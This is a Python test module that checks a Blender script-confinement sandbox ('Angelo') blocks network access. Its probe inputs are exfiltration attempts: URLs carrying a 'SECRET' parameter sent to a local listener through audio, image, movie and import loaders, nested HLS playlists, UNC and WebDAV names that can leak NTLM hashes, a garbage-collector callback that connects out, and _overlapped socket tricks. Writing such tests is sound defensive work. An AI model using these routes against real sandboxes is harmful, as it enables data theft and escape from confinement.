# SPDX-FileCopyrightText: 2026 Hyperbond Studio Pte. Ltd.
# SPDX-License-Identifier: GPL-2.0-or-later
"""No network through a native reader or writer (test_blender_script_confinement's network checks; BREAKIT
reread-r210-1c2c4edaf48 M-1).

The bundled FFmpeg has network protocols (http, tcp, udp, rtp, rtmp, ftp), and Blender opens whatever path it is
given: ``aud.Sound("http://127.0.0.1:PORT/?k=SECRET").data()`` reached a local listener on stock Blender 5.2, as
native traffic that raises no Python socket audit event. A localhost listener here counts every connection. Each
case runs a loader that could take a URL, from a confined script, then once more from Angelo's own code after the
region (a URL a script left in data and Angelo later loads). The listener must see nothing in any case; a refusal or
an error inside the case is fine. Run only inside Blender, from the suite.
"""

import os
import sys
import tempfile
import time
from pathlib import Path

URL_CASES = (
    # (name, source run in the script with URL bound; it may raise)
    ("aud_sound_data", "import aud\naud.Sound(URL).data()"),
    ("aud_sound_file", "import aud\naud.Sound.file(URL).data()"),
    ("aud_sound_write", "import aud\naud.Sound.sine(440).limit(0, 0.05).write(URL, 44100, aud.CHANNELS_MONO, "
                        "aud.FORMAT_S16, aud.CONTAINER_OGG, aud.CODEC_VORBIS)"),
    ("sounds_load", "s = bpy.data.sounds.load(URL, check_existing=False)\ns.samplerate"),
    ("movieclips_load", "c = bpy.data.movieclips.load(URL)\nc.size[:]"),
    ("images_load", "i = bpy.data.images.load(URL, check_existing=False)\ni.size[:]"),
    ("fonts_load", "bpy.data.fonts.load(URL, check_existing=False)"),
    ("image_sequence", "i = bpy.data.images.load(URL, check_existing=False)\ni.source = 'SEQUENCE'\ni.size[:]"),
    ("strip_movie", "se = bpy.context.scene.sequence_editor_create()\nse.strips.new_movie('m', URL, 1, 1)"),
    ("strip_sound", "se = bpy.context.scene.sequence_editor_create()\nse.strips.new_sound('s', URL, 2, 1)"),
    ("strip_image", "se = bpy.context.scene.sequence_editor_create()\nse.strips.new_image('i', URL, 3, 1)"),
    ("usd_import", "bpy.ops.wm.usd_import(filepath=URL)"),
    ("alembic_import", "bpy.ops.wm.alembic_import(filepath=URL)"),
)


LISTENER = r"""
import socket, sys
log = open(sys.argv[1], "a", buffering=1)
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("127.0.0.1", 0))
server.listen(16)
print(server.getsockname()[1], flush=True)
while True:
    connection, _ = server.accept()
    try:
        connection.settimeout(0.5)
        first = connection.recv(256).decode("latin-1", "replace")
        log.write(repr(first) + "\n")
        connection.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
    except OSError:
        log.write("'(connected)'\n")
    finally:
        connection.close()
"""


class Listener:
    """A TCP listener on 127.0.0.1, in a process of its own (a native reader holds the GIL while it connects, so a
    listener thread in this process could never accept): each connection is logged and answered with an HTTP 404,
    so a client that got through (the red case) fails at once instead of waiting."""

    def __init__(self):
        import subprocess
        self.folder = tempfile.TemporaryDirectory(prefix="angelo-listener-")
        self.log = Path(self.folder.name) / "connections.log"
        self.log.touch()
        self.process = subprocess.Popen([sys.executable, "-I", "-c", LISTENER, str(self.log)],
                                        stdout=subprocess.PIPE, text=True)
        self.port = int(self.process.stdout.readline())

    @property
    def seen(self):
        return self.log.read_text().splitlines()

    def count(self):
        time.sleep(0.3)   # A connection made just before the case returned is logged by now.
        return len(self.seen)

    def stop(self):
        self.process.kill()
        self.process.wait()   # Killed: it ends at once.
        self.folder.cleanup()


def _remote_lookups(run, check, skip, listener):
    """Windows: names a script gives the confinement's own lookups, not a file open: a compile's file name, a code
    object's (`trusted()` resolves both, and the region's end resolves a kept code object's again, unconfined), and a
    package `__path__` entry the region's end searches for a module the region gained (review-confine-fixes-
    3cb71ae002d MUST-1, review-confine-fixes-eddf9bcda75 MUST-1). No lookup may open them. Observable only through
    WebDAV: `\\\\127.0.0.1@PORT` makes the WebDAV redirector connect to the listener. A control opened by this suite's
    own code tells whether the redirector runs here; when it doesn't, nothing could be seen, so each case is reported
    skipped with that reason, never passed (the gtest `ConfinementRemoteLookups` counts the system calls directly)."""
    import os
    remote = r"\\127.0.0.1@%d\DavWWWRoot\angelo" % listener.port
    before = listener.count()
    try:
        os.stat(remote + r"\control")
    except OSError:
        pass
    observable = listener.count() > before
    package, submodule = _unloaded_submodule()
    held = {}
    cases = [("compile", "compile('pass', URL, 'exec')", remote + r"\x.py"),
             ("code_replace", "HELD['code'] = (lambda: 0).__code__.replace(co_filename=URL)", remote + r"\x.py")]
    if submodule is None:
        skip("network_remote_lookup_never_opened_package_path",
             "every candidate submodule was already imported in this process, so none is a name the region gains")
    else:
        # The module is a name the region gains; the entry is searched for it at the region's end, before `__path__`
        # is put back.
        cases.append(("package_path", "import importlib, sys\nimportlib.import_module(SUB)\n"
                                      "sys.modules[PKG].__path__.insert(0, URL)\n", remote))
    for route, source, url in cases:
        name = "network_remote_lookup_never_opened_%s" % route
        if not observable:
            skip(name, "the WebDAV redirector (WebClient) does not run here, so a lookup could not be seen")
            continue
        before = listener.count()
        outcome = run(source, URL=url, HELD=held, PKG=package, SUB=submodule)
        held.clear()   # The kept code object is resolved at the region's end, before this.
        seen = listener.count() - before
        check(name, seen == 0, {"connections": seen, "outcome": outcome})


def _unloaded_submodule():
    """An installed package's submodule nobody has imported yet: ``(package, "package.submodule")``, or
    ``(None, None)`` when none is left."""
    import importlib.util
    for package, child in (("wsgiref", "simple_server"), ("xmlrpc", "server"), ("email", "mime.audio"),
                           ("html", "parser"), ("http", "cookiejar"), ("concurrent", "futures.process")):
        full = package + "." + child
        if full not in sys.modules and importlib.util.find_spec(package) is not None:
            return package, full
    return None, None


def _make_local_media(folder):
    """A still, a tone and a three-frame movie in `folder`, made unconfined by this build; returns (movie or None,
    why the movie is missing). Never raises: a failure here is a failed check, not a stopped suite."""
    import aud
    import bpy
    image = bpy.data.images.new("angelo-strip-still", 16, 8)
    image.filepath_raw = os.path.join(folder, "still.png")
    image.file_format = "PNG"
    image.save()
    bpy.data.images.remove(image)
    aud.Sound.sine(440).limit(0, 0.5).write(os.path.join(folder, "tone.wav"), 44100, aud.CHANNELS_MONO,
                                            aud.FORMAT_S16, aud.CONTAINER_WAV, aud.CODEC_PCM)
    # The movie comes from the still through the sequencer, which renders on the CPU with no engine and no GPU, so
    # this suite runs on a machine without OpenGL (an engine render of a camera would draw on the GPU).
    scene = bpy.data.scenes.new("angelo-strip-movie")
    try:
        scene.render.use_sequencer = True
        scene.sequence_editor_create().strips.new_image("angelo-strip-frames", os.path.join(folder, "still.png"), 1, 1)
        scene.sequence_editor.strips["angelo-strip-frames"].frame_final_duration = 3
        scene.render.resolution_x, scene.render.resolution_y, scene.render.resolution_percentage = 32, 32, 100
        scene.frame_start, scene.frame_end = 1, 3
        scene.render.image_settings.media_type = "VIDEO"
        scene.render.image_settings.file_format = "FFMPEG"
        scene.render.ffmpeg.format = "MPEG4"
        scene.render.ffmpeg.codec = "H264"
        scene.render.filepath = os.path.join(folder, "clip")
        bpy.ops.render.render(animation=True, scene=scene.name)
        movie = next((os.path.join(folder, name) for name in os.listdir(folder) if name.startswith("clip")), None)
        return movie, None if movie else "the render wrote no movie"
    except Exception as error:   # noqa: BLE001 - reported by the movie check.
        return None, repr(error)[:200]
    finally:
        bpy.data.scenes.remove(scene)


def _local_strips(run, check):
    """The other side of the strip routes' refusal: a confined script still makes movie, sound and image strips from
    ordinary local files, and each file is really read (its size, length or sample rate comes back)."""
    with tempfile.TemporaryDirectory(prefix="angelo-local-strips-") as folder:
        try:
            movie, missing = _make_local_media(folder)
        except Exception as error:   # noqa: BLE001 - the still or the tone could not be made.
            for name in ("image", "sound", "movie"):
                check("strip_%s_from_a_local_file_works" % name, False, "media not made: %r" % error)
            return
        out = {}
        outcome = run(
            "se = bpy.context.scene.sequence_editor_create()\n"
            "i = se.strips.new_image('local-image', IMAGE, 4, 1)\n"
            "out['image'] = (i.elements[0].orig_width, i.elements[0].orig_height)\n"
            "s = se.strips.new_sound('local-sound', SOUND, 5, 1)\n"
            "out['sound'] = (s.sound.samplerate, s.frame_final_duration)\n"
            "if MOVIE:\n"
            "    m = se.strips.new_movie('local-movie', MOVIE, 6, 1)\n"
            "    out['movie'] = (m.frame_final_duration, m.elements[0].orig_width)\n",
            IMAGE=os.path.join(folder, "still.png"), SOUND=os.path.join(folder, "tone.wav"), MOVIE=movie, out=out)
        check("strip_image_from_a_local_file_works", outcome.get("refused") is None and out.get("image") == (16, 8),
              {"out": out, "outcome": outcome})
        check("strip_sound_from_a_local_file_works", outcome.get("refused") is None and
              bool(out.get("sound")) and out["sound"][0] == 44100 and out["sound"][1] > 0,
              {"out": out, "outcome": outcome})
        check("strip_movie_from_a_local_file_works", movie is not None and outcome.get("refused") is None and
              bool(out.get("movie")) and out["movie"][0] >= 1 and out["movie"][1] == 32,
              {"movie": movie and os.path.basename(movie), "missing": missing, "out": out, "outcome": outcome})


def _place_strings(run, check, NETWORK):
    """Strings that name a place Angelo's process uses later are judged when a script sets them (Ruling 11): a
    project asset library's address is the network, its folder is judged as a path, and an ordinary local folder is
    still accepted. The collection takes no `self`, so with no active project (the suite's case) the call reports
    "No active project" instead of crashing on the missing project."""
    import bpy
    call = ("bpy.types.ProjectAssetLibraryCollection.new(name='angelo-probe', directory=FOLDER, "
            "remote_url=ADDRESS)")
    outcome = run(call, FOLDER="", ADDRESS="https://angelo-probe.invalid/library")
    check("place_string_project_library_address_refused", outcome.get("refused") == NETWORK, outcome)
    # A remote folder in the platform's own form: the automounter's /net (Linux, macOS) or a UNC name (Windows, where
    # /net is an ordinary local path), as the lookup cases spell it.
    remote = r"\\angelo-probe.invalid\s\library" if sys.platform == "win32" else "/net/angelo-probe.invalid/library"
    outcome = run(call, FOLDER=remote, ADDRESS="")
    check("place_string_project_library_folder_refused", outcome.get("refused") == NETWORK,
          {"folder": remote, "outcome": outcome})
    with tempfile.TemporaryDirectory(prefix="angelo-place-") as folder:
        outcome = run(call, FOLDER=folder, ADDRESS="")
        check("place_string_project_library_local_folder_not_refused", outcome.get("refused") is None, outcome)
        if bpy.data.project is None:
            check("place_string_project_library_without_a_project_reports",
                  "No active project" in outcome.get("error", ""), outcome)


# Script code run inside socket.socketpair (a gc callback here; a __del__ or a signal handler likewise) must not get
# socketpair's own allowance (break-it-confine-reparse 36bcdd2 read MUST-4): a low threshold makes a collection run
# while socketpair allocates, and the callback connects to the listener.
SOCKETPAIR_INSIDE = """import gc, socket
inside = [False]
def connect(phase, info):
    if phase == "start" and inside[0] and not STATE.get("fired_inside"):
        STATE["fired_inside"] = True
        try:
            s = socket.create_connection(("127.0.0.1", PORT), timeout=2)
            s.sendall(b"GET /socketpair-inside?k=SECRET HTTP/1.0\\r\\n\\r\\n")
            s.close()
            STATE["connected"] = True
        except BaseException as error:
            STATE["error"] = repr(error)
gc.callbacks.append(connect)
old = gc.get_threshold()
gc.set_threshold(1)
try:
    inside[0] = True
    a, b = socket.socketpair()
    inside[0] = False
    a.close()
    b.close()
finally:
    gc.set_threshold(*old)
    gc.callbacks.remove(connect)
"""


def _socketpair_inside(run, check, skip, listener):
    state = {}
    before = listener.count()
    outcome = run(SOCKETPAIR_INSIDE, PORT=listener.port, STATE=state)
    seen = listener.count() - before
    if not state.get("fired_inside"):
        skip("network_refused_inside_socketpair", "no collection ran inside socketpair here: %r" % (outcome,))
        return
    check("network_refused_inside_socketpair", seen == 0 and not state.get("connected"),
          {"connections": seen, "state": state, "outcome": outcome})


def run_network_cases(run, check, NETWORK, skip=None):
    """Each URL case from a script, then from Angelo's own code; ``run`` and ``check`` are the suite's."""
    listener = Listener()
    try:
        for name, source in URL_CASES:
            print("NETWORK_CASE script %s" % name, flush=True)   # A hang names its case in the suite's log.
            url = "http://127.0.0.1:%d/probe-%s?k=SECRET" % (listener.port, name)
            before = listener.count()
            outcome = run(source, URL=url)
            seen = listener.count() - before
            check("network_refused_in_script_" + name, seen == 0,
                  {"connections": seen, "first": listener.seen[before:before + 1], "outcome": outcome})
        _socketpair_inside(run, check, skip or (lambda name, reason: check(name, False, reason)), listener)
        # A local file whose format names the network inside it: FFmpeg hands the whitelist on to what a format
        # opens, so the nested http stays closed, from a script and from Angelo (break-it-confine-fixes-b31e34840ca
        # S-1). HLS opens what a file playlist names over http unless the whitelist it inherited says no: a media
        # playlist's segment and a master playlist's variant playlist. The concat list is a default guard, not the
        # whitelist's: FFmpeg's concat demuxer refuses a URL entry itself (`safe=1`, its default, which nothing in
        # Blender or audaspace changes; review-confine-fixes-3cb71ae002d S-2), so it stays as a guard on that default.
        with tempfile.TemporaryDirectory(prefix="angelo-nested-") as nested:
            playlist = Path(nested) / "list.m3u8"
            playlist.write_text("#EXTM3U\n#EXT-X-TARGETDURATION:1\n#EXTINF:1,\nhttp://127.0.0.1:%d/hls.ts?k=SECRET\n"
                                "#EXT-X-ENDLIST\n" % listener.port)
            master = Path(nested) / "master.m3u8"
            master.write_text("#EXTM3U\n#EXT-X-STREAM-INF:BANDWIDTH=1000\n"
                              "http://127.0.0.1:%d/variant.m3u8?k=SECRET\n" % listener.port)
            concat = Path(nested) / "list.ffconcat"
            concat.write_text("ffconcat version 1.0\nfile 'http://127.0.0.1:%d/concat.wav?k=SECRET'\n" % listener.port)
            for label, local in (("m3u8", playlist), ("m3u8_master", master), ("ffconcat_safe_default", concat)):
                before = listener.count()
                outcome = run("import aud\naud.Sound(URL).data()", URL=str(local))
                seen = listener.count() - before
                check("network_nested_refused_in_script_" + label, seen == 0, {"connections": seen, "outcome": outcome})
                before = listener.count()
                try:
                    import aud
                    aud.Sound(str(local)).data()
                except Exception:   # noqa: BLE001 - failing to open is the expected outcome.
                    pass
                seen = listener.count() - before
                check("network_nested_refused_later_" + label, seen == 0, {"connections": seen})
        # Windows: a remote file name (UNC in any spelling) is refused by its text before anything resolves it, since
        # opening it is the effect (DNS, SMB or WebDAV, the person's NTLM hash; break-it-confine-fixes-b31e34840ca
        # MUST-2). Elsewhere a leading // is the local root.
        if sys.platform == "win32":
            for label, unc in (("backslash", r"\\angelo-probe.invalid\s\x.wav"),
                               ("slash", "//angelo-probe.invalid/s/x.wav"),
                               ("unc_prefix", r"\\?\UNC\angelo-probe.invalid\s\x.wav"),
                               ("webdav", r"\\angelo-probe.invalid@SSL\DavWWWRoot\x.wav")):
                for route, source in (("open", "open(URL).read()"), ("image", "bpy.data.images.load(URL)"),
                                      ("sound", "import aud\naud.Sound(URL).data()")):
                    outcome = run(source, URL=unc)
                    # Blender's own loaders read a leading `//` as the document's folder; with a saved document
                    # `//host/s/x` is a local name there (the guard expands it exactly as Blender does: BLI_path_abs),
                    # and only an unsaved document leaves it a remote one (head-12 green on build3).
                    import bpy
                    local = route == "image" and unc.startswith("//") and not bpy.path.abspath(unc).startswith("//")
                    if local:
                        check("network_remote_name_blend_relative_%s_%s" % (label, route),
                              outcome.get("refused") != NETWORK, (outcome, bpy.path.abspath(unc)))
                        continue
                    check("network_remote_name_refused_%s_%s" % (label, route), outcome.get("refused") == NETWORK,
                          outcome)
            _remote_lookups(run, check, skip or (lambda name, reason: check(name, False, reason)), listener)
            # _overlapped raises no audit event: a script's own socket bound, connected or readied for reuse through
            # it is refused as the network (36bcdd2 read MUST-3), as is a pipe opened by name.
            for label, source in (
                    ("bind_local", "import _overlapped, socket\na, b = socket.socketpair()\n"
                                   "_overlapped.BindLocal(a.fileno(), socket.AF_INET)"),
                    ("wsa_connect", "import _overlapped, socket\na, b = socket.socketpair()\n"
                                    "_overlapped.WSAConnect(a.fileno(), ('127.0.0.1', PORT))"),
                    ("connect_ex", "import _overlapped, socket\na, b = socket.socketpair()\n"
                                   "_overlapped.Overlapped(0).ConnectEx(a.fileno(), ('127.0.0.1', PORT))"),
                    ("disconnect_ex", "import _overlapped, socket\na, b = socket.socketpair()\n"
                                      "_overlapped.Overlapped(0).DisconnectEx(a.fileno(), 2)"),
                    ("connect_pipe", "import _overlapped\n"
                                     "_overlapped.ConnectPipe(r'\\\\angelo-probe.invalid\\pipe\\x')")):
                before = listener.count()
                outcome = run(source, PORT=listener.port)
                check("network_overlapped_refused_%s" % label,
                      outcome.get("refused") == NETWORK and listener.count() == before, outcome)
        # A hostname leaks through its DNS query alone, before any connection: from a script it must be refused
        # before anything native runs (the gate names it a URL), so nothing can look it up.
        host = "http://angelo-probe.invalid:%d/dns?k=SECRET" % listener.port
        outcome = run("import aud\naud.Sound(URL).data()", URL=host)
        check("network_hostname_refused_before_lookup", outcome.get("refused") == NETWORK, outcome)
        # The same loaders run by Angelo's own code (no region): a URL a script left in data is loaded later by
        # Angelo, unconfined, so FFmpeg itself must refuse every protocol but files.
        import bpy
        for name, source in URL_CASES:
            if name in ("usd_import", "alembic_import", "strip_movie", "strip_sound", "strip_image"):
                continue   # Operators and strips are the script's routes; the readers below are the same.
            print("NETWORK_CASE later %s" % name, flush=True)
            url = "http://127.0.0.1:%d/later-%s?k=SECRET" % (listener.port, name)
            before = listener.count()
            try:
                exec(compile(source, "<angelo-suite-later>", "exec"), {"bpy": bpy, "URL": url})
            except Exception:   # noqa: BLE001 - failing to load is the expected outcome.
                pass
            seen = listener.count() - before
            check("network_refused_later_" + name, seen == 0,
                  {"connections": seen, "first": listener.seen[before:before + 1]})
        _local_strips(run, check)
        _place_strings(run, check, NETWORK)
    finally:
        listener.stop()
